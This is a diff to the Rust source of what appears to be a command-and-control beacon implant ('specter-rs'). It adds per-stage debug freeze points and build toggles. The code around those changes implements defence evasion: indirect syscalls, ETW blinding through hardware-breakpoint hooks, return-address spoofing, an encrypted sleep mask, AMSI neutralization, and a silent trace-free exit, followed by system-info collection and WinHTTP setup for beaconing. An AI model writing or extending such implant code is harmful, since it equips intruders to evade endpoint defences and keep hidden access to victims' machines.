@@ -150,12 +150,25 @@ pub unsafe fn instance() -> *mut Instance {
 /// Resolve the modules and APIs the beacon needs and build the instance.
 /// Returns `None` when anything essential is missing — the caller must then
 /// exit silently (or spin if even the exit is unresolvable).
+/// Diagnostic gate (config `stages`): freeze right after the n-th
+/// completed bootstrap stage. The process then hangs in a silent spin
+/// loop (observable as alive=true, no further activity) — the harness
+/// bisection knob for stage-by-stage debugging on the real OS.
+unsafe fn stage_gate(n: u32) {
+    if config::BOOTSTRAP_STAGES == n {
+        loop {
+            core::hint::spin_loop();
+        }
+    }
+}
+
 unsafe fn bootstrap() -> Option<Instance> {
     // The debug channel opens first, with nothing but the PEB: every stage
     // below is traced, so a dead bootstrap leaves a trail naming the
     // failing stage instead of a silent thread death.
     let dbg = crate::runtime::debug::open_handle();
     crate::runtime::debug::log_handle(dbg, b"bs: log open\n");
+    stage_gate(0);
 
     let peb = get_peb();
     let ntdll = peb::find_module(peb, H_NTDLL);
@@ -165,6 +178,7 @@ unsafe fn bootstrap() -> Option<Instance> {
         return None;
     }
     crate::runtime::debug::log_handle(dbg, b"bs: modules ok\n");
+    stage_gate(1);
 
     // Silent exit first: everything else may fail and must still be able
     // to leave without a trace.
@@ -178,6 +192,7 @@ unsafe fn bootstrap() -> Option<Instance> {
         unsafe extern "system" fn(u32),
     >(exit_thread_ptr as *const core::ffi::c_void);
     crate::runtime::debug::log_handle(dbg, b"bs: exit ok\n");
+    stage_gate(2);
 
     // Indirect syscall table (gadgets + NtDelayExecution SSN).
     let syscall_table = match syscalls::build(ntdll) {
@@ -188,6 +203,7 @@ unsafe fn bootstrap() -> Option<Instance> {
         }
     };
     crate::runtime::debug::log_handle(dbg, b"bs: syscalls ok\n");
+    stage_gate(3);
 
     let get_time_ptr = peb::find_export(kernel32, H_GET_SYSTEM_TIME_AS_FILE_TIME);
     let qpc_ptr = peb::find_export(kernel32, H_QUERY_PERFORMANCE_COUNTER);
@@ -199,11 +215,17 @@ unsafe fn bootstrap() -> Option<Instance> {
         return None;
     }
     crate::runtime::debug::log_handle(dbg, b"bs: clock ok\n");
+    stage_gate(4);
 
     // ETW blinding: resolve the hook targets and the VEH installer, then
     // install the handler and arm the debug registers. Any failure simply
-    // leaves the hooks disabled — the beacon keeps running.
-    let (mut etw_hooks, add_veh) = beacon_hwbp::etw_hooks(ntdll, kernel32);
+    // leaves the hooks disabled — the beacon keeps running. A `hooks: false`
+    // build skips the whole hook machinery (compat/diagnostic mode).
+    let (mut etw_hooks, add_veh) = if config::HOOKS {
+        beacon_hwbp::etw_hooks(ntdll, kernel32)
+    } else {
+        (specter_core::hwbp::no_hooks(), 0)
+    };
     if add_veh != 0
         && syscall_table.get_ctx_ssn != u32::MAX
         && syscall_table.set_ctx_ssn != u32::MAX
@@ -215,26 +237,39 @@ unsafe fn bootstrap() -> Option<Instance> {
         beacon_hwbp::install(&syscall_table, &etw_hooks, add_veh);
     }
     crate::runtime::debug::log_handle(dbg, b"bs: etw ok\n");
+    stage_gate(5);
 
     // Return-address spoofing gadget: mask the beacon's presence in API
     // stack walks. Unavailable gadget = direct calls (non-fatal).
     let retspoof_gadget = crate::runtime::retspoof::resolve_gadget(kernel32).unwrap_or(0);
     crate::runtime::debug::log_handle(dbg, b"bs: gadget ok\n");
+    stage_gate(6);
 
     // Encrypted sleep mask: static bounds resolved once; the per-cycle
     // fields (seed, gadget, interval) refresh every sleep. Discovery
     // failure disables the mask — the beacon sleeps unencrypted rather
     // than encrypting unknown bounds.
-    let mut sleep_mask = crate::runtime::sleepmask::build_params();
-    if let Some(ref mut mask) = sleep_mask {
-        mask.ssn = syscall_table.delay_ssn;
-    }
+    // The encrypted sleep mask is a per-build choice (config `sleep_mask`,
+    // on by default): off = plain indirect sleep cycles.
+    let sleep_mask = if config::SLEEP_MASK {
+        let mut mask = crate::runtime::sleepmask::build_params();
+        if let Some(ref mut m) = mask {
+            m.ssn = syscall_table.delay_ssn;
+        }
+        mask
+    } else {
+        None
+    };
     crate::runtime::debug::log_handle(dbg, b"bs: sleepmask ok\n");
+    stage_gate(7);
 
     // AMSI neutralization: hook now if amsi.dll is mapped, defer the rest
     // through loader notifications (Dr3 — the ETW hooks left it free).
-    crate::runtime::amsi::install(peb, ntdll, &syscall_table, &mut etw_hooks);
+    if config::HOOKS {
+        crate::runtime::amsi::install(peb, ntdll, &syscall_table, &mut etw_hooks);
+    }
     crate::runtime::debug::log_handle(dbg, b"bs: amsi ok\n");
+    stage_gate(8);
 
     // Seed the jitter RNG from the performance counter; a failed read falls
     // back to the remapped zero seed (never zero-stuck).
@@ -268,6 +303,11 @@ unsafe fn bootstrap() -> Option<Instance> {
         })
     };
     crate::runtime::debug::log_handle(dbg, b"bs: heap ok\n");
+    stage_gate(9);
+
+    let wh = winhttp::resolve(peb, kernel32);
+    crate::runtime::debug::log_handle(dbg, b"bs: winhttp ok\n");
+    let sysinfo = crate::runtime::sysinfo::collect(peb);
 
     // Session identity (the beat's SessionKey field and the routing id):
     // generated per run, stable for the whole session.
@@ -301,8 +341,8 @@ unsafe fn bootstrap() -> Option<Instance> {
         >(get_time_ptr as *const core::ffi::c_void),
         exit_thread,
         rng,
-        winhttp: winhttp::resolve(peb, kernel32),
-        sysinfo: crate::runtime::sysinfo::collect(peb),
+        winhttp: wh,
+        sysinfo,
         session_key,
         agent_id,
         sleep_ms: config::SLEEP_MS,
@@ -612,6 +652,7 @@ pub unsafe fn main() -> ! {
     };
     store_instance(&mut instance);
     crate::runtime::debug::log(&instance, b"specter-rs: bootstrap ok\n");
+    stage_gate(12);
 
     loop {
         // Killswitch: checked once here (bootstrap, before any network
